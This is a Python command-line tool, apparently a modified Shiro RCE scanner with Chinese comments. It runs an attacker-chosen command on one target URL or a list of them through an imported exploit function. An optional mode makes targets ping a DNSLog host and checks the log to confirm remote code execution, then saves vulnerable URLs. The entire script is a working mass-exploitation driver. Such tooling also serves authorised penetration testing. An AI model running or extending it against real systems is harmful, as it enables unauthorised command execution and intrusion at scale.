#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import argparse
import random
import requests
import string

from module.main import scripts


banner = r"""
 ____  _     _          ____                  ____  _           
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __ |  _ \| |_   _ ___  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \| |_) | | | | / __| 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |  __/| | |_| \__ \ 
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|_|   |_|\__,_|___/ 

                           原作者： 斯文
                           修改：  Hack3rHan
"""


def verify(url, dnslog_url='{randstr}',
           check_dnslog_url='{randstr}', dns_log_flag=''):
    # 增加可选的验证功能，使用DNSLog验证，方便批量验证。
    randstr = ''.join(random.sample(string.ascii_letters, 8))
    check_dnslog_url = check_dnslog_url.format(randstr=randstr)
    dnslog_url = dnslog_url.format(randstr=randstr)
    dnslog_command = "ping {dnslog_url}".format(dnslog_url=dnslog_url)
    scripts(url, dnslog_command)
    try:
        resp = requests.get(check_dnslog_url)
        if dns_log_flag in resp.text:
            return True
        return False
    except Exception as err:
        print(err)
        return False


if __name__ == '__main__':
    print(banner)

    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='待检测单个URL。', action='store')
    parse.add_argument('-f', '--file', help='待检测URL文件，换行分割。', action='store')
    parse.add_argument('-c', '--command', help='要执行的命令。', action='store')
    parse.add_argument('-v', '--verify', help='使用DNSLog验证。', action='store_true')
    parse.add_argument('--output', help='输出到文件，文件不存在会自动创建。', action='store')
    parse.add_argument('--dnslog', help='包含{randstr}的字符串，randstr会被format。', action='store')
    parse.add_argument('--flag', help='DNSlog检查页面包含的关键词。', action='store')
    parse.add_argument('--check_dnslog', help='包含{randstr}的字符串，randstr会被format。', action='store')

    options = parse.parse_args()

    # Command 和 Verify 必须指定其中一个
    if not options.command and not options.verify:
        parse.print_help()
        exit()

    # 只发送Payload不做验证
    if not options.verify:
        # 传入单个URL
        if options.url:
            scripts(options.url, options.command)
        # 传入写有URL的文件
        elif options.file:
            with open(options.file, 'r') as target_url_file:
                target_url = target_url_file.readline()
                while target_url:
                    scripts(target_url, options.command)
                    target_url = target_url_file.readline()
        # 未传入目标，命令不正确。
        else:
            parse.print_help()

    # 使用DNSLog进行验证
    else:
        # 检查验证需要的DNSlog参数
        if not options.dnslog or not options.check_dnslog or not options.flag:
            parse.print_help()
            print('参数 -v 依赖于参数--dnslog、--check_dnslog和--flag')
            exit()

        # 传入单个URL
        if options.url:
            if verify(options.url, options.dnslog,
                      options.check_dnslog, options.flag):
                print("[*]VULN FOUND IN {}".format(options.url))
                # 是否将存在漏洞的URL保存到文件
                if options.output:
                    with open(options.output, 'a+') as out_file:
                        out_file.write(options.url)
            else:
                print("[-]VULN NOT FOUND")
        # 传入写有URL的文件
        elif options.file:
            with open(options.file, 'r') as target_url_file:
                target_url = target_url_file.readline()
                while target_url:
                    if verify(target_url, options.dnslog,
                              options.check_dnslog, options.flag):
                        print("[*]VULN FOUND IN {}".format(target_url))
                        # 是否将存在漏洞的URL保存到文件
                        if options.output:
                            with open(options.output, 'a+') as out_file:
                                out_file.write(target_url)
                    else:
                        print("[-]VULN NOT FOUND")
                    target_url = target_url_file.readline()
        # 未传入目标，命令不正确。
        else:
            parse.print_help()
